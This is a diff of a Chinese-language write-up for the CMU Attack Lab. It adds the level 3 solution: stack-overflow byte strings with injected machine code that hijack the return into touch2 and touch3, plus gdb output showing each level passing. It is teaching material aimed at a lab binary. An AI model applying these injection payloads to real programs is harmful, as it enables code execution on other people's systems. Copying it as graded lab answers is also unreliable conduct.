@@ -66,7 +66,7 @@ Continuing. Type string:Touch1!: You called touch1() Valid solution for level 1 
     result  1:PASS:0xffffffff:ctarget:1:12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF C0 17 40 00 00 00 00 00  [Inferior 1 (process 11388) exited normally]
     
 ### 4.2 level 2
-这个其实也是栈溢出的原理，只不过在ret到touch2之前必须给传一个参数给edi。这个很纠结，起初我以为是不能执行栈上的数据的 (现在基本都有堆栈保护哈），后来网上搜了一下发现这个是可以执行stack中的数据的。
+这个其实也是栈溢出的原理，只不过在ret到touch2之前必须给传一个参数给edi。这个很纠结，起初我以为是不能执行栈上的数据的，后来网上搜了一下发现这个是可以执行stack中的数据的。
 如果可以执行stack中的数据，那么可以操作的空间就大了很多。两次ret可以解决，第一次ret到stack上执行指令，然后操作rsp，第二次ret到touch2，这是我第一次尝试的str：
 
     00 00 00 00 00 00 00 00
@@ -88,6 +88,30 @@ Continuing. Type string:Touch1!: You called touch1() Valid solution for level 1 
             lab     attacklab
             result  1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 17 40 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 90 DC 61 55 00 00 00 00 
     [Inferior 1 (process 46846) exited normally]
+    
+### 4.3 level 3
+这个题目和上一个题目主要的区别就是需要传一个字符串地址，重点在于字符串的保存，我选择保存在test栈中，最后结果如下：
 
-### 4.3 
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00  
+    b8 dc 61 55 00 00 00 00
+    35 39 62 39 39 37 66 61 
+    00 00 00 00 00 00 00 00   
+    48 c7 c7 a8 dc 61 55
+    68 fa 18 40 00 
+    c3 00 00 00 
+
+    (gdb) 
+    Continuing.
+    Type string:Touch3!: You called touch3("59b997fa")
+    Valid solution for level 3 with target ctarget
+    PASS: Would have posted the following:
+            user id bovik
+            course  15213-f15
+            lab     attacklab
+            result  1:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B8 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 
+    [Inferior 1 (process 346910) exited normally]
 
